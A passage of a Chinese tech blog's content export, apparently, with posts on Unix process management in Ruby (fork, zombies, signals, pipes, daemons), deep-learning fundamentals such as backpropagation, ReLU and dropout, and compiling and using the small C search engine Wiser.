我们每个人都设置过环境变量，环境变量是包含进程数据的键值对。所有进程都从其父进程继承环境变量，它们由父进程设置并被子进程所继承。每一个进程都有环境变量，环境变量对于特定进程而言是全局性的。比如环境变量PWD对应的值为当前的工作目录等等。环境变量经常作为一种将输入传递到命令行程序中的方法。 参数 所有进程都可以访问名为ARGV的特殊数组（p ARGV），它是一个参数向量或数组。保存了在命令行中传递给当前进程的参数。有些像C语言中main函数中第二个参数：char** argv。 进程名 系统中每一个进程都有名称，进程名可以在运行期间被修改并作为一种通信手段。一般都会有一个全局变量来存储当前进程的名称。可以通过给这个全局变量赋值来修改当前进程的名称。 我们可以用puts $PROGRAM_NAME来打印当前进程的进程名。 退出码 我们写C程序的时候，总是默认加上return 0，可能大家也遇到过其他的返回值，例如exit(1)等，这里的0、1就是退出码。 所有进程在退出时都带有数字退出码(0-255)用于指明进程是否顺利结束。一般退出码为0的进程被认为是顺利结束，其他的退出码则表明出现了错误，不同的退出码代表不同的错误。 尽管退出码通常用来表明不同的错误，它们其实是一种通信手段。作为程序员的你可以以适合自己程序的方式来处理各种进程退出码。 exit 默认进程退出码为0，可以传递指定的退出码。exit 22代表定制进程退出码为22，不指定数字则默认为0，而且指定退出码在0-255之间的数值才是有效的。 exit! 默认进程退出码为1，可以传递指定的退出码。exit!33代表定制进程退出码为33，不指定数字时默认为1，而且指定退出码在0-255之间的数值才是有效的。 abort 会将当前进程的退出码设置为1，而且可以传递一条消息给STDERR。例如abort “Something went wrong!”，则进程退出码为1且会在STDERR中打印“Something went wrong”。注意该方法不能指定退出码。 raise raise方法不会立即结束进程，它只是抛出一个异常，该异常会沿着调用栈向上传递并可能会得到处理。如果没有代码对其进程处理，那么这个未处理的异常将会终结该进程。类似于abort方法，一个未处理的异常会将退出码设置为1。也可以传递一条消息给STDERR。例如raise “Something went wrong!”，则进程退出码为1且会在STDERR中打印“Something went wrong”。注意该方法也不能指定退出码。 fork()与友好进程 fork()系统调用允许运行中的进程以编程的形式创建新的进程，这个心进程和原始进程一模一样。调用fork()的进程被称为父进程，新创建的进程被称为子进程。因子进程是一个全新的进程，所以它拥有自己唯一的进程id。 子进程从父进程处继承了其所占用内存中的所有内容，以及所有属于父进程的已打开的文件描述符的编号。这样，两个进程就可以共享打开的文件、套接字等。因子进程会复制父进程在内存中的所有内容，所以子进程可以随意更改其内存内容的副本，而不会对父进程造成任何影响(后面会介绍COW写时复制技术)。 对于fork()方法的一次调用实际上会返回两次。fork方法创造了一个新进程，在调用进程(父进程)中返回一次，且会返回子进程的pid；在新创建的进程(子进程)中又返回一次，返回0。 fork创建了一个和旧进程一模一样的新进程。所以试想一个使用了500MB内存的进程进行了衍生，那么就有1GB的内存被占用了。重复同样的操作十次，很快就会耗尽内存，这通常被称为“fork炸弹”。 所以现代的Unix/Linux操作系统采用写时复制(copy-on-write, COW)的方法来克服这个问题。COW将实际的内存复制操作推迟到了真正需要写入的时候。所以说父进程和子进程实际上是在共享内存中的数据，直到它们其中一个需要对数据进行修改，届时才会进行内存复制，使得两个进程保持适当的隔离。 这里多补充点COW的知识，自己在面试中也被问到这个问题，当时并不了解这个知识点，所以对这个知识点印象比较深刻。当采用COW技术时，子进程并不完全复制父进程的数据，只是以只读的方式共享父进程的页表，并将符进程的页表项也标记为只读。当父子进程中任何一个进程试图修改这些地址空间时，就会引发系统的页错误异常。异常错误处理程序将会生成该页的一份复制，并修改进程的页表项，指向新生成的页面，并将该页标记为已修改。 除了修改的数据和页面之外，其余的部分依然可以共享。 在一些语言当中，比如ruby中，会通过block代码块来使用fork。将一个block代码块传递给fork方法，那么这个block代码块将在新的子进程中执行，而父进程会跳过block中的内容。而且子进程执行完block之后就会退出，并不会像父进程那样指向随后的代码。 孤儿进程 当父进程结束后而子进程没有结束时，子进程会照常继续运行，此时子进程被称为孤儿进程。孤儿进程会被系统当中的守护进程所收养，该进程是一种长期运行的进程，而且是有意作为孤儿进程存在。 进程等待与僵尸进程 wait是一个阻塞调用，该调用使得父进程一直等到它的某个子进程退出以后才继续执行。wait会返回其等待子进程的pid。wait2会返回两个值(pid, status)。除了pid之外还包括status，该变量存储有大量关于子进程的有用的信息，可让我们获知某个进程是怎样退出的。 wait/wait2是等待任意子进程的退出，而waitpid/waitpid2则是等待特定的由pid指定的子进程退出。 内核将退出的进程信息加入到队列，这样以来父进程就总是能够依照子进程退出的顺序接收到信息。就是说，即使子进程退出而父进程还没有准备妥当的时候，父进程也总能够通过队列获取到每个子进程的退出信息。注意，如果不存在子进程，调用wait的任一变体都会抛出ERRNO::ECHILD异常。所以最好让调用wait的数量和创建的子进程的数量相等才不会抛出异常。 一些服务器会使用看护进程这一模式：有一个衍生出多个并发子进程的进程，这个进程看管这些子进程，确保它们能够保持响应，并对子进程的退出做出响应，这个进程就是看护进程。 内核会将已退出的子进程的状态信息加入队列，所以即便父进程在子进程退出很久之后才调用wait，依然可以获取它的状态信息。内核会一直保留已退出的子进程的状态信息直到父进程调用wait请求这些消息。如果父进程一直不发出请求，那么状态信息就会被内核一直保留着，因此创建一个即发即弃的子进程却不去请求状态信息，便是在浪费内核资源，比如pid，要知道内核可创建的pid和进程控制块PCB是有限的，如果一直创建进程其父进程却不去请求它的退出信息，那么pid和PCB有可能会被耗尽而使得系统无法继续产生新进程。此时的子进程就被称为僵尸进程，所以说僵尸进程是有害的。 任何应结束的进程，如果它的状态信息一直未能读取，那么它就是一个僵尸进程，任何子进程在结束之时其父进程仍在运行，那么这个子进程很快就会称为僵尸进程。一旦父进程读取了僵尸进程的状态信息，那么它就不复存在，也就不再消耗内核资源。 有一种避免僵尸进程出现的方法就是分离父子进程，当父进程新创建一个子进程以后，如果不打算调用wait去等待和读取子进程的退出信息，可以使用detach方法。detach方法核心就是生成一个新线程，这个线程唯一的工作就是等待有pid所指定的那个进程退出并获取进程退出信息，从而确保内核不会一直保留进程的状态信息造成僵尸进程的出现和内核资源的浪费。 那么怎么识别僵尸进程呢？ 很简答，我们使用如下指令：pid = fork{ sleep 1} ; puts pid; sleep的方式，发现结果为：z。 信号量 wait为父进程提供了一种很好方式来监管子进程。但它是一个阻塞调用：直到子进程结束，调用才会返回，任何一行代码都可能被信号中断。信号投递时不可靠的。如果你的代码正在处理CHLD信号，这时候另一个子进程结束了，那么你未必能收到第二个CHLD信号(CHLD信号：提醒父进程子进程退出的信号)。如果同一个信号在极短间隔内被多次收到，就会出现这种情况。这时可以考虑使用wait的非阻塞方法，形如wait(-1, Process::WNOHANG)。当获得一个信号并返回值以后就继续等待信号的产生。 信号是一种异步通信，当进程从内核接收到一个信号时，它可以执行下列某一个操作： 忽略该信号； 执行特定操作； 执行默认操作。 信号有内核发出，信号是由一个进程发送给另一个进程，不过内核作为中介而已。下表为常用信号介绍，大部分信号的默认行为都是终止进程，其中dump动作表示进程会立即结束并进行核心转储(栈跟踪)，而且比较特殊信号有SIGKILL和SIGSTOP信号不能被捕获、阻塞或忽略，SIGSR1和SIGSR2两个信号对应的操作由你的进程来定义。 信号是一个了不起的工具，不过捕获一个信号有点像使用全局变量，有可能把其他程序锁依赖的东西给修改了，不过和全局变量不同的是信号处理程序并没有命名空间。从最佳事件角度来说，个人代码不应该定义任何信号处理程序，除非它是服务器。正如一个从命令行启动的长期运行的进程，库代码极少会捕获信号。 进程可以在任何时候接收到信号，这就是信号的美所在！而且信号是异步的。有了信号，一旦知道了对方的pid，系统中的进程便可以彼此通信，使得信号成为一种极其强大的通信工具，常见的用法是使用kill方法来发送信号。实践当中，信号多是由长期运行的进程响应和使用，例如服务器和守护进程。而多数情况下，发送信号的都是人类用户而非自动化程序。 进程通讯 进程间通信(IPC)两个常见的实用方法是管道和套接字对(socket pairs)。 管道是一个单向数据流。打开一个管道，一个进程拥有管道的一段，另一个进程拥有另一端。然后数据就沿着管道单向传递。因此如果某个进程将自己作为一个管道的reader，而非writer，那么它就无法向管道中写入数据，反之亦然。例如在ruby脚本程序中： 1234 reader，writer = IO.pipewriter.write(&quot;I am writing something..&quot;)writer.closeputs reader.read 结果为： 1 I am writing something.. pipe返回一个包含两个元素的数组，第一个元素为reader的信息，第二个元素为writer的信息。 向管道写完信息就关闭writer，是因为reader调用read方法时，会不停地试图从管道中读取数据，直到读到一个EOF(文件结束标志)。这个标志告诉reader已经读完管道中所有的数据了。只要writer保持打开，那么reader就可能读到更多的数据，因此它就会一直等待。在读取之前关闭writer，将一个EOF放入管道中，这样一来，reader获得原始数据之后就会停止读取。要是忘记或者省去关闭writer这一步，那么reader就会被阻塞并不停地试图读取数据。 因为管道是单向的，所以再上诉程序中，reader只能读取，writer只能写入。 当某个进程衍生出一个子进程的时候，会与子进程共享打开的资源，管道也被认为是一种资源，它有自己的文件描述符等，因此可以与子进程共享。 当使用诸如管道或TCP套接字这样的IO流时，将数据写入流中，之后跟着一些特定协议的分隔符，随后从IO流中读取数据时，一次读取一块(chuck)，遇到分隔符就停止读取。 Unix套接字是一种只能用于在同一台物理主机中进行通信的套接字，它比TCP套接字快很多，非常适合用于IPC。 管道和套接字都是对进程间通信的有益抽象。它们即快速有简单，多被用作通信通道，来代替更为原始的方法，如共享数据库或日志文件。使用哪种方法取决于自己的需要，不过记得管道提供的是单向通信，套接字提供的是双向通信。 终端进程 我们在终端执行每一条命令，其实都是创建了一个终端进程。 exec()系统调用非常简单，它允许使用另一个进程来替换当前进程，exec()这种转变是有去无回的，一旦你将当前进程转变为另外一个别的进程，那就再也变不回来了。 在要生成新进程的时候，fork()+exec()的组合是常见的一种用法，使用fork()创建一个新进程，然后用exec()把这个进程变成自己想要的进程，你的当前进程仍像从前一样运行，也仍可以根据需要生成其他进程。如果程序依赖于exec()调用的输出结果，可用wait方法来确保你的程序一直等到子进程完成它的工作，这样就可取回结果。exec()在默认情况下不会关闭任何打开的文件描述符或进行内存清理。 把字符串传递给exec实际上会启动一个shell进程，然后shell进程对这个字符串进行解释，传递一个数组的话，它会跳过shell，直接将此数组作为新进程的ARGV-参数数组，除非真的需要，一般尽可能地传递数组。 fork()是有成本的，记住这点有益无害，有时候它会成为性能瓶颈，主要是因为fork()的新子进程的两个独特属性： 获得了一份父进程在内存中所有内容的副本； 获得了父进程已打开的所有文件描述符的副本。 有一个系统调用posix_spawn，子保留了第2条，没有保留第1条。posix_spawn所生成的子进程可以访问父进程打开的所有文件描述符，却无法与父进程共享内存。这也是为什么posix_spawn比fork快、更有效率的原因。但事务都有两面性，也会因此而缺乏灵活性。 守护进程 守护进程是在后台运行的进程，不受终端用户控制。Web服务器或数据库服务器都属于常见的守护进程，它们一直在后台运行响应请求。守护进程也是操作系统的核心功能，有很多进程一直在后台运行以保证系统的正常运行，任何进程都可变成守护进程。 当内核被引导时会产生一个叫做init的进程。该进程的pid是1，而ppid是0，作为所有进程的祖父。它是首个进程，没有祖先。一个孤儿进程会被init进程收养，孤儿进程的ppid始终是1，这是内核能够确保一直运行的唯一进程。 每一个进程都属于某个组，每一个组都有唯一的整数id，称为进程组id。进程组是一个相关进程的集合，通常是父进程与子进程。但是也可以按照需要将进程分组，可以通过setpgrp(new_group_ip)方法来设置进程组id。通常情况下，进程组id和进程组组长的id是相同的。进程组组长是终端命令的发起进程。也就是说，如果在终端启动一个进程，那么它就会成为一个新进程组的组长，它所创建的子进程就成为同一个进程组的组员。 这里进一步说明一下，之前讲过孤儿进程，子进程在父进程退出后会被init进程收养而继续运行，这是父进程退出的行为，但是如果父进程由终端控制并被信号终止的话，孤儿进程也会被终止的。这是因为父子进程属于同一个进程组，而父进程由终端控制，当父进程收到来自终端的终止信号时，与父进程属于同一个进程组的子进程也会收到终止信号而被终止。 会话组是更高一级的抽象，它是进程组的集合。一个会话组可以依附于一个终端，也可以不依附与任何终端，比如守护进程。终端用一种特殊的方法来处理会话组：发送给会话领导的信号会被转发到该会话中的所有进程组内，然后再转发到这些进程组中的所有进程。系统调用getsid()可用来检索当前的会话组id。 以下是创建一个守护进程的过程： 首先在终端创建一个进程，并在进程中衍生出一个子进程，然后作为父进程的自己退出。启动该进程的终端察觉到进程退出后，将控制返回给用户，但是衍生出的子进程仍然拥有从父进程中继承而来的组id和会话组id，此时这个衍生进程既非会话领导也非进程组组长。因终端与衍生进程之间仍有牵连，如果终端发送信号到衍生进程的会话组，衍生进程会接收到这个信号，但我们想要的是完全脱离终端。 setsid方法可使得衍生进程成为一个新进程组的组长和新会话组的领导，而且此时新的会话组并没有控制终端。注意，如果在某个已经是进程组组长的进程中调用setsid方法，则会失败，它只能从子进程中调用。 已经成为进程组和会话组组长的衍生进程再次进行衍生，然后自己退出。新衍生出的进程不再是进程组和会话组组长，由于之前会话领导并没有相应的控制终端，且此进程也不是会话领导，因此该进程绝对不会有相应的控制终端存在，如此就可以确保进程现在是完全脱离了控制终端并且可以独立运行。 将进程的工作目录更改为系统的根目录，可避免进程的启动进程出于个各种问题被删除或者卸载。 将所有标准流重定向到“/dev/null”，也就是将其忽略，主要是因为守护进程已不再依附于某个终端会话，所以标准流也就无用了，但是不能简单的关闭，因为一些进程可能还指望它们随时可用。 以下是ruby语言创建一个守护进程的完整程序： 12345678 exit if fork Process.setsidexit if forkDir.chdir &quot;/&quot;STDIN.reopen &quot;/dev/null&quot;STDOUT.reopen &quot;/dev/null&quot;, &quot;a&quot;STDERR.reopen &quot;/dev/null&quot;, &quot;a&quot; 对于是否需要创建一个守护进程，就应该问自己一个基本问题：这个进程是否需要一直保持响应？如果答案为否，那么你也许可以考虑定时任务或后台作业系统，如果答案是肯定的，那就去创建，不用犹豫。 本文链接： http://www.meng.uno/articles/aeaab565/ 欢迎转载！","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/categories/操作系统/"}],"tags":[{"name":"Unix","slug":"Unix","permalink":"http://www.meng.uno/tags/Unix/"},{"name":"进程","slug":"进程","permalink":"http://www.meng.uno/tags/进程/"}]},{"title":"深度学习基础","slug":"DL-深度学习基础","date":"2018-03-04T04:29:41.000Z","updated":"2018-08-16T04:31:41.045Z","comments":true,"path":"articles/c0b3d81d/","link":"","permalink":"http://www.meng.uno/articles/c0b3d81d/","excerpt":"梯度下降法 梯度下降法的作用/目的/本质 * 参数优化的一种策略，用于寻找局部最小值 * 微积分中使用梯度表示函数增长最快的方向；相应的，神经网络中使用负梯度来指示损失函数下降最快的方向 * 梯度实际上是损失函数对网络中每个参数的偏导所组成的向量，其中计算各偏导的方法即反向传播算法 * 从另一个角度来理解方向这个概念，可以认为负梯度中的每一项实际传达了两个信息： 1. 正负号在告诉输入向量应该调大还是调小——正调大，负调小 2. 每一项的相对大小表明每个输入值对函数值的影","text":"梯度下降法 梯度下降法的作用/目的/本质 参数优化的一种策略，用于寻找局部最小值 微积分中使用梯度表示函数增长最快的方向；相应的，神经网络中使用负梯度来指示损失函数下降最快的方向 梯度实际上是损失函数对网络中每个参数的偏导所组成的向量，其中计算各偏导的方法即反向传播算法 从另一个角度来理解方向这个概念，可以认为负梯度中的每一项实际传达了两个信息： 正负号在告诉输入向量应该调大还是调小——正调大，负调小 每一项的相对大小表明每个输入值对函数值的影响程度；换言之，也就是调整各权重对于网络的影响 随机梯度下降 基本的梯度下降法要求每次使用所有训练样本的平均损失来更新参数 为了加快计算效率，一般的做法会首先打乱所有训练样本，每次计算梯度时会随机抽取其中一批(Batch)来计算平均损失——这就是“随机梯度下降”。 也有地方将使用全部、一个、一批样本的方法分别称为“批量梯度下降”、“随机梯度下降”、“小批量梯度下降” 随机梯度下降中“批”的大小对优化效果的影响 《深度学习》 8.1.3 批量算法和小批量算法 较大的批能得到更精确的梯度估计，但回报是小于线性的。 较小的批能带来更好的泛化误差，泛化误差通常在批大小为 1 时最好。但是，因为梯度估计的高方差，小批量训练需要较小的学习率以保持稳定性，这意味着更长的训练时间。 原因可能是由于小批量在学习过程中带来了噪声，使产生了一些正则化效果 (Wilson and Martinez, 2003) 内存消耗和批的大小成正比，当批量处理中的所有样本可以并行处理时。 在某些硬件上使用特定大小可以减少运行时间。尤其是在使用 GPU 时，通常使用 2 的幂数作为批量大小可以获得更少的运行时间。一般，2 的幂数的取值范围是 32 到 256，16 有时在尝试大模型时使用。 反向传播算法 反向传播的作用/目的/本质 反向传播概述： 梯度下降法中需要利用损失函数对所有参数的梯度来寻找局部最小值点； 而反向传播算法就是用于计算该梯度的具体方法，其本质是利用链式法则对每个参数求偏导。 反向传播的公式推导 可以用 4 个公式总结反向传播的过程 标量形式： [](http://www.codecogs.com/eqnedit.php?latex=\\begin{aligned}&amp;space;\\frac{\\partial&amp;space;C}{\\partial&amp;space;{\\color{Red}&amp;space;a_j{(L)}}}=\\frac{\\partial&amp;space;C({\\color{Red}&amp;space;a_j{(L)}},y_j)}{\\partial&amp;space;{\\color{Red}&amp;space;a_j^{(L)}}}&amp;space;\\end{aligned}) 上标 (l) 表示网络的层，(L) 表示输出层（最后一层）；下标 j 和 k 指示神经元的位置；w_jk 表示 l 层的第 j 个神经元与(l-1)层第 k 个神经元连线上的权重 符号说明，其中： (w,b) 为网络参数：权值和偏置 z 表示上一层激活值的线性组合 a 即 “activation”，表示每一层的激活值，上标(l)表示所在隐藏层，(L)表示输出层 C 表示激活函数，其参数为神经网络输出层的激活值a^(L)，与样本的标签y 以 均方误差（MSE） 损失函数为例，有 [](http://www.codecogs.com/eqnedit.php?latex=\\begin{aligned}&amp;space;\\frac{\\partial&amp;space;C}{\\partial&amp;space;{\\color{Red}&amp;space;a_j{(L)}}}&amp;=\\frac{\\partial&amp;space;C({\\color{Red}&amp;space;a_j{(L)}},y_j)}{\\partial&amp;space;{\\color{Red}&amp;space;a_j{(L)}}}&amp;space;\\&amp;space;&amp;=\\frac{\\partial&amp;space;\\left&amp;space;(&amp;space;\\frac{1}{2}({\\color{Red}a_j{(L)}}-y_j)2&amp;space;\\right&amp;space;)&amp;space;}{\\partial&amp;space;{\\color{Red}a_j{(L)}}}={\\color{Red}a_j^{(L)}}-y&amp;space;\\end{aligned}) Nielsen 的课程中提供了另一种更利于计算的表述，本质上是一样的。 The four fundamental equations behind backpropagation 激活函数 激活函数的作用——为什么要使用非线性激活函数？ 使用激活函数的目的是为了向网络中加入非线性因素； 从而加强网络的表示能力，解决线性模型无法解决的问题 神经网络激励函数的作用是什么？有没有形象的解释？ - 知乎 为什么加入非线性因素能够加强网络的表示能力？——神经网络的万能近似定理 神经网络的万能近似定理认为主要神经网络具有至少一个非线性隐藏层，那么只要给予网络足够数量的隐藏单元，它就可以以任意的精度来近似任何从一个有限维空间到另一个有限维空间的函数。 如果不使用非线性激活函数，那么每一层输出都是上层输入的线性组合； 此时无论网络有多少层，其整体也将是线性的，这会导致失去万能近似的性质 《深度学习》 6.4.1 万能近似性质和深度； 但仅部分层是纯线性是可以接受的，这有助于减少网络中的参数。 《深度学习》 6.3.3 其他隐藏单元 常见的激活函数 《深度学习》 6.3 隐藏单元 整流线性单元 ReLU 公式与图像 ReLU 通常是激活函数较好的默认选择 ReLU 的拓展 ReLU 及其扩展都基于以下公式： 当 α=0 时，即标准的线性整流单元 绝对值整流（absolute value rectification） 固定 α = -1，此时整流函数即绝对值函数 g(z)=|z| 渗漏整流线性单元（Leaky ReLU, Maas et al., 2013） 固定 α 为一个小值，比如 0.01 参数化整流线性单元（parametric ReLU, PReLU, He et al., 2015） 将 α 作为一个可学习的参数 maxout 单元 (Goodfellow et al., 2013a) maxout 单元 进一步扩展了 ReLU，它是一个可学习的 k 段函数 Keras 简单实现 12345 # input shape: [n, input_dim]# output shape: [n, output_dim]W = init(shape=[k, input_dim, output_dim])b = zeros(shape=[k, output_dim])output = K.max(K.dot(x, W) + b, axis=1) 参数数量是普通全连接层的 k 倍 深度学习（二十三）Maxout网络学习 - CSDN博客 sigmoid 与 tanh sigmoid(z)，常记作 σ(z): tanh(z) 的图像与 sigmoid(z) 大致相同，区别是值域为 (-1, 1) 其他激活函数 很多未发布的非线性激活函数也能表现的很好，但没有比流行的激活函数表现的更好。比如使用 cos 也能在 MNIST 任务上得到小于 1% 的误差。通常新的隐藏单元类型只有在被明确证明能够提供显著改进时才会被发布。 线性激活函数： 如果神经网络的每一层都由线性变换组成，那么网络作为一个整体也将是线性的，这会导致失去万能近似的性质。但是，仅部分层是纯线性是可以接受的，这可以帮助减少网络中的参数。 softmax： softmax 单元常作为网络的输出层，它很自然地表示了具有 k 个可能值的离散型随机变量的概率分布。 径向基函数（radial basis function, RBF）： 在神经网络中很少使用 RBF 作为激活函数，因为它对大部分 x 都饱和到 0，所以很难优化。 softplus： softplus 是 ReLU 的平滑版本。 [](http://www.codecogs.com/eqnedit.php?latex=g(z)=\\zeta(z)=\\log(1+\\exp(z))) 通常不鼓励使用 softplus 函数，大家可能希望它具有优于整流线性单元的性质，但根据经验来看，它并没有。 (Glorot et al., 2011a) 比较了这两者，发现 ReLU 的结果更好。 硬双曲正切函数（hard tanh）： [](http://www.codecogs.com/eqnedit.php?latex=g(a)=\\max(-1,\\min(1,a))) 它的形状和 tanh 以及整流线性单元类似，但是不同于后者，它是有界的。 ReLU 相比 sigmoid 的优势 (3) 避免梯度消失*** sigmoid函数在输入取绝对值非常大的正值或负值时会出现饱和现象——在图像上表现为变得很平，此时函数会对输入的微小变化不敏感——从而造成梯度消失； ReLU 的导数始终是一个常数——负半区为 0，正半区为 1——所以不会发生梯度消失现象 减缓过拟合** ReLU 在负半区的输出为 0。一旦神经元的激活值进入负半区，那么该激活值就不会产生梯度/不会被训练，造成了网络的稀疏性——稀疏激活 这有助于减少参数的相互依赖，缓解过拟合问题的发生 加速计算* ReLU 的求导不涉及浮点运算，所以速度更快 总结自知乎两个答案 Ans1 &amp; Ans2 为什么 ReLU 不是全程可微/可导也能用于基于梯度的学习？ 虽然从数学的角度看 ReLU 在 0 点不可导，因为它的左导数和右导数不相等； 但是在实现时通常会返回左导数或右导数的其中一个，而不是报告一个导数不存在的错误。从而避免了这个问题 正则化 L1/L2 范数正则化 《深度学习》 7.1.1 L2 参数正则化 &amp; 7.1.2 - L1 参数正则化 机器学习中正则化项L1和L2的直观理解 - CSDN博客 L1/L2 范数的作用、异同 相同点 限制模型的学习能力——通过限制参数的规模，使模型偏好于权值较小的目标函数，防止过拟合。 不同点 L1 正则化可以产生更稀疏的权值矩阵，可以用于特征选择，同时一定程度上防止过拟合；L2 正则化主要用于防止模型过拟合 L1 正则化适用于特征之间有关联的情况；L2 正则化适用于特征之间没有关联的情况。 为什么 L1 和 L2 正则化可以防止过拟合？ L1 &amp; L2 正则化会使模型偏好于更小的权值。 更小的权值意味着更低的模型复杂度；添加 L1 &amp; L2 正则化相当于为模型添加了某种先验，限制了参数的分布，从而降低了模型的复杂度。 模型的复杂度降低，意味着模型对于噪声与异常点的抗干扰性的能力增强，从而提高模型的泛化能力。——直观来说，就是对训练数据的拟合刚刚好，不会过分拟合训练数据（比如异常点，噪声）——奥卡姆剃刀原理 为什么 L1 正则化可以产生稀疏权值，而 L2 不会？ 对目标函数添加范数正则化，训练时相当于在范数的约束下求目标函数 J 的最小值 带有L1 范数（左）和L2 范数（右）约束的二维图示 图中 J 与 L1 首次相交的点即是最优解。L1 在和每个坐标轴相交的地方都会有“顶点”出现，多维的情况下，这些顶点会更多；在顶点的位置就会产生稀疏的解。而 J 与这些“顶点”相交的机会远大于其他点，因此 L1 正则化会产生稀疏的解。 L2 不会产生“顶点”，因此 J 与 L2 相交的点具有稀疏性的概率就会变得非常小。 Dropout 与 Bagging 集成方法 《深度学习》 7.12 Dropout Bagging 集成方法 集成方法的主要想法是分别训练不同的模型，然后让所有模型表决最终的输出。 集成方法奏效的原因是不同的模型通常不会在测试集上产生相同的误差。 集成模型能至少与它的任一成员表现得一样好。如果成员的误差是独立的，集成将显著提升模型的性能。 Bagging 是一种集成策略——具体来说，Bagging 涉及构造 k 个不同的数据集。 每个数据集从原始数据集中重复采样构成，和原始数据集具有相同数量的样例——这意味着，每个数据集以高概率缺少一些来自原始数据集的例子，还包含若干重复的例子 更具体的，如果采样所得的训练集与原始数据集大小相同，那所得数据集中大概有原始数据集 2/3 的实例 集成方法与神经网络： 神经网络能找到足够多的不同的解，意味着他们可以从模型平均中受益——即使所有模型都在同一数据集上训练。 神经网络中随机初始化的差异、批训练数据的随机选择、超参数的差异等非确定性实现往往足以使得集成中的不同成员具有部分独立的误差。 Dropout 策略 简单来说，Dropout 通过参数共享提供了一种廉价的 Bagging 集成近似—— Dropout 策略相当于集成了包括所有从基础网络除去部分单元后形成的子网络。 通常，隐藏层的采样概率为 0.5，输入的采样概率为 0.8；超参数也可以采样，但其采样概率一般为 1 权重比例推断规则 权重比例推断规则的目的是确保在测试时一个单元的期望总输入与在训练时该单元的期望总输入大致相同。 实践时，如果使用 0.5 的采样概率，权重比例规则相当于在训练结束后将权重除 2，然后像平常一样使用模型；等价的，另一种方法是在训练期间将单元的状态乘 2。 Dropout 与 Bagging 的不同 在 Bagging 的情况下，所有模型都是独立的；而在 Dropout 的情况下，所有模型共享参数，其中每个模型继承父神经网络参数的不同子集。 在 Bagging 的情况下，每一个模型都会在其相应训练集上训练到收敛。而在 Dropout 的情况下，通常大部分模型都没有显式地被训练；取而代之的是，在单个步骤中我们训练一小部分的子网络，参数共享会使得剩余的子网络也能有好的参数设定。 深度学习实践 参数初始化 一般使用服从的高斯分布（mean=0, stddev=1）或均匀分布的随机值作为权重的初始化参数；使用 0 作为偏置的初始化参数 一些启发式方法会根据输入与输出的单元数来决定初始值的范围 比如 glorot_uniform 方法 (Glorot and Bengio, 2010) Keras 全连接层默认的权重初始化方法 其他初始化方法 随机正交矩阵（Orthogonal） 截断高斯分布（Truncated normal distribution） Keras 提供的所有参数初始化方法：Keras/Initializers CNN 卷积神经网络 CNN 与 LSTM 的区别 CNN更像视觉，天然具有二维整体性；而LSTM更像听觉和语音，总是通过串行的方式来理解整体。 首次超越LSTM : Facebook 门卷积网络新模型能否取代递归模型？ 本文链接： http://www.meng.uno/articles/undefined/ 欢迎转载！","categories":[{"name":"DeepLearning","slug":"DeepLearning","permalink":"http://www.meng.uno/categories/DeepLearning/"}],"tags":[{"name":"深度学习","slug":"深度学习","permalink":"http://www.meng.uno/tags/深度学习/"},{"name":"AI","slug":"AI","permalink":"http://www.meng.uno/tags/AI/"}]},{"title":"自制简单搜索引擎及Wiser的使用","slug":"wiser","date":"2018-03-03T06:10:07.000Z","updated":"2018-03-03T06:53:43.553Z","comments":true,"path":"articles/c49b2caf/","link":"","permalink":"http://www.meng.uno/articles/c49b2caf/","excerpt":"自己开发一个搜索引擎，可能是每一个计算机爱好者的梦想，但是当我们看到网上开源搜索引擎那么庞大时，未免有点害怕。那么开发一个搜索引擎真的很难么？ 本博文在阅读了《How to Develop a Search Engineer》之后，总结而成。 代码下载：Wiser 搜索引擎简介 搜索引擎（Search Engine）是指根据一定的策略、运用计算机技术从互联网上搜集信息，在对信息进行组织和处理后，为用户提供检索服务。在日常生活中，可以看到 Google 等 Web 检索网站，还有邮件检索和专利检索等各种应用程序。 背景知识 在自己写一个搜索引擎之前，需要先了解基本的原理和概念。比如分词，","text":"自己开发一个搜索引擎，可能是每一个计算机爱好者的梦想，但是当我们看到网上开源搜索引擎那么庞大时，未免有点害怕。那么开发一个搜索引擎真的很难么？ 本博文在阅读了《How to Develop a Search Engineer》之后，总结而成。 代码下载：Wiser 搜索引擎简介 搜索引擎（Search Engine）是指根据一定的策略、运用计算机技术从互联网上搜集信息，在对信息进行组织和处理后，为用户提供检索服务。在日常生活中，可以看到 Google 等 Web 检索网站，还有邮件检索和专利检索等各种应用程序。 背景知识 在自己写一个搜索引擎之前，需要先了解基本的原理和概念。比如分词，倒排索引，排序算法（BM25、PageRank）等。 搜索引擎工作步骤分为这几步： 爬虫模块 Crawler 在网页上抓取感兴趣的网页数据存储为 Cached pages 索引构造器 Indexer 对 Cached pages 处理生成倒排索引(Inverted Index) 对查询词 Query 在倒排索引中查找对应的文档 Document 计算 Query 和 Document 的关联度，返回给用户 TopK 个结果 根据用户点击 TopK 的行为去修正用户查询的 Query，形成反馈闭环。 搜索引擎的四大组件： 文档管理器(Document Manager) 索引构建器(Indexer) 索引管理器(Index Manager) 索引检索器(Index Searcher) 组件关系图： Wiser使用 编译运行 下载好wiser.zip文件，并解压缩到相应位置，进入文件夹，运行make wiser，稍待片刻，即可完成编译。 收集数据 在本次使用wiser的实验中，直接从https://dumps.wikimedia.org/zhwiki/latest/下载相应的xml文件即可（省去了实际的爬虫过程）。 使用wiser存入sqlite使用命令：wiser -x XXX.xml -m 100 wiki.db 此时，我们已经将10条数据存入.db文件中了。 构建倒排索引 *在上一步已经完成。 检索文档 使用wiser搜索一个关键词使用命令：wiser -q &quot;XXX&quot; wiki.db 排序并呈现 从截图中可见，score代表匹配指数，已经计算好，并返回给我们。 Wiser代码剖析 在此先简单的介绍各个主要的.c文件实现的功能： wiser.c: 主程序，接收命令行输入，并相应的调用其他函数； database.c: 操作sqlite，包括增，查等功能； search.c: 全文检索，TF-IDF求相关度； postings.c: 倒排索引压缩与解压缩； token.c: 创建倒排索引，N-gram分词； wikiload.c: 加载wikipedia上下载的xml文件； util.c: 编码相关的杂项。 其他详情，还请实际使用啊！ 本文链接： http://www.meng.uno/articles/c49b2caf/ 